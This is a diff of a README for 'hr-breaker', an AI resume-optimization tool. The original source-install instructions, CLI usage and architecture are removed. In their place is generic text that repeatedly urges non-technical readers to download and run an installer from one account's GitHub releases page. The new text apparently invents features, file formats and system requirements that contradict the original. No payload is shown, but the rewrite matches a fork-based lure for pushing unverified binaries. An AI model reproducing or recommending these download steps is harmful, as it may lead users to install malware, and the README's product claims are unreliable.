@@ -1,125 +1,70 @@
-# HR-Breaker
+# 🚀 hr-breaker - Optimize Your Resume with AI
 
-Resume optimization tool that transforms any resume into a job-specific, ATS-friendly PDF.
+[![Download hr-breaker](https://img.shields.io/badge/Download-hr--breaker-brightgreen.svg)](https://github.com/Zypozzz/hr-breaker/releases)
 
-![Python 3.10–3.13](https://img.shields.io/badge/python-3.10--3.13-blue.svg)
+## 📋 Overview
 
-## Features
+hr-breaker helps you enhance your resume using artificial intelligence. It analyzes job descriptions and suggests ways to improve your resume. This tool aims to increase your chances of landing your dream job.
 
-- **Any format in** - LaTeX, plain text, markdown, HTML, PDF
-- **Optimized PDF out** - Single-page, professionally formatted
-- **LLM-powered optimization** - Tailors content to job requirements
-- **Minimal changes** - Preserves your content, only restructures for fit
-- **No fabrication** - Hallucination detection prevents made-up claims
-- **Opinionated formatting** - Follows proven resume guidelines (one page, no fluff, etc.)
-- **Multi-filter validation** - ATS simulation, keyword matching, structure checks
-- **User instructions** - Guide the optimizer with extra context ("Focus on Python", "Add K8s cert")
-- **Multi-language output** - Optimize in English, then translate (e.g. `-l ru` for Russian)
-- **Web UI + CLI** - Streamlit dashboard or command-line
-- **Debug mode** - Inspect optimization iterations
-- **Cross-platform** - Works on macOS, Linux, and Windows
+## 🚀 Getting Started
 
-## How It Works
+Follow these steps to download and run hr-breaker on your computer. No programming knowledge is required.
 
-1. Upload resume in any text format (content source only)
-2. Provide job posting URL or text description
-3. LLM extracts content and generates optimized HTML resume
-4. System runs internal filters (ATS simulation, keyword matching, hallucination detection)
-5. If filters reject, regenerates using feedback
-6. When all checks pass, renders HTML→PDF via WeasyPrint
+## 📥 Download & Install
 
-## Quick Start
+1. **Visit the Releases Page**: Click the link below to access the page where you can download hr-breaker.
 
-```bash
-# Install
-uv sync
+   [Download hr-breaker](https://github.com/Zypozzz/hr-breaker/releases)
 
-# Configure
-cp .env.example .env
-# Edit .env and add your GOOGLE_API_KEY
+2. **Choose the Right File**: Look for the latest version. You will see an option for downloading hr-breaker. Download the file suitable for your system.
 
-# Run web UI
-uv run streamlit run src/hr_breaker/main.py
-```
+3. **Run the Installer**: Double-click the downloaded file to start the installation process. Follow the prompts that appear on your screen.
 
-## Usage
+4. **Open hr-breaker**: Once the installation is complete, you can find hr-breaker in your applications. Launch it to get started.
 
-### Web UI
+## 🖥️ System Requirements
 
-Launch with `uv run streamlit run src/hr_breaker/main.py`
+To run hr-breaker, ensure your computer meets the following requirements:
 
-1. Paste or upload resume
-2. Enter job URL or description
-3. Click optimize
-4. Download PDF
+- **Operating System**: Windows 10 or later, or macOS Mojave or later
+- **Memory**: At least 4 GB of RAM
+- **Processor**: Intel Core i3 or equivalent
+- **Disk Space**: 200 MB of free space
 
-### CLI
+## 🛠️ Features
 
-```bash
-# From URL
-uv run hr-breaker optimize resume.txt https://example.com/job
+- **AI Resume Optimization**: hr-breaker analyzes job descriptions and suggests improvements to tailor your resume.
+- **User-Friendly Interface**: The simple design makes it easy for anyone to use, regardless of technical skills.
+- **Customization Suggestions**: Get tailored tips to enhance specific sections of your resume.
 
-# From job description file
-uv run hr-breaker optimize resume.txt job.txt
+## 📄 How to Use hr-breaker
 
-# Debug mode (saves iterations)
-uv run hr-breaker optimize resume.txt job.txt -d
+1. **Upload Your Resume**: Click on the upload button and select your existing resume file. hr-breaker accepts .docx and .pdf formats.
+   
+2. **Select a Job Description**: Paste or upload the job description you are applying for. hr-breaker will analyze the content.
 
-# User instructions - guide the optimizer
-uv run hr-breaker optimize resume.txt job.txt -i "Focus on Python, add K8s cert"
+3. **Review Suggestions**: After processing, hr-breaker will display suggestions to optimize your resume. Pay attention to each suggestion for better results.
 
-# Translate output to another language
-uv run hr-breaker optimize resume.txt https://example.com/job -l ru
+4. **Make Changes**: Implement the suggested changes in your resume. Save the updated document.
 
-# Lenient mode - relaxes content constraints but still prevents fabricating experience. Use with caution!
-uv run hr-breaker optimize resume.txt job.txt --no-shame
+5. **Re-Check**: Optionally, you can re-upload the revised resume and job description to see further improvements.
 
-# List generated PDFs
-uv run hr-breaker list
-```
+## 📧 Support
 
-## Output
+If you have questions or need assistance, please reach out through the Issues section on our GitHub page. We strive to respond promptly to all inquiries.
 
-- Final PDFs: `output/<name>_<company>_<role>.pdf`
-- Debug iterations: `output/debug_<company>_<role>/`
-- Records: `output/index.json`
+## 📣 Community Contributions
 
-## Configuration
+We encourage everyone to contribute to hr-breaker. If you have ideas for new features, bug reports, or improvements, please submit them on GitHub. Together, we can enhance hr-breaker for everyone!
 
-Copy `.env.example` to `.env` and set `GOOGLE_API_KEY` (required). See `.env.example` for all available options.
+## 🔗 Additional Resources
 
----
+- [GitHub Repository](https://github.com/Zypozzz/hr-breaker)
+- [User Guide](https://github.com/Zypozzz/hr-breaker/wiki)
+- [Frequently Asked Questions](https://github.com/Zypozzz/hr-breaker/wiki/FAQ)
 
-## Architecture
+## 📥 Download again
 
-```
-src/hr_breaker/
-├── agents/          # Pydantic-AI agents (optimizer, reviewer, etc.)
-├── filters/         # Validation plugins (ATS, keywords, hallucination)
-├── services/        # Rendering, scraping, caching
-│   └── scrapers/    # Job scraper implementations
-├── models/          # Pydantic data models
-├── orchestration.py # Core optimization loop
-├── main.py          # Streamlit UI
-└── cli.py           # Click CLI
-```
+Remember, you can always download hr-breaker from the Releases page here:
 
-**Filters** (run by priority):
-
-- 0: ContentLengthChecker - Size check
-- 1: DataValidator - HTML structure validation
-- 3: HallucinationChecker - Detect fabricated claims not supported by original resume
-- 4: KeywordMatcher - TF-IDF matching
-- 5: LLMChecker - Visual formatting check and LLM-based ATS simulation
-- 6: VectorSimilarityMatcher - Semantic similarity
-- 7: AIGeneratedChecker - Detect AI-sounding text
-
-## Development
-
-```bash
-# Run tests
-uv run pytest tests/
-
-# Install dev dependencies
-uv sync --group dev
-```
+[Download hr-breaker](https://github.com/Zypozzz/hr-breaker/releases)
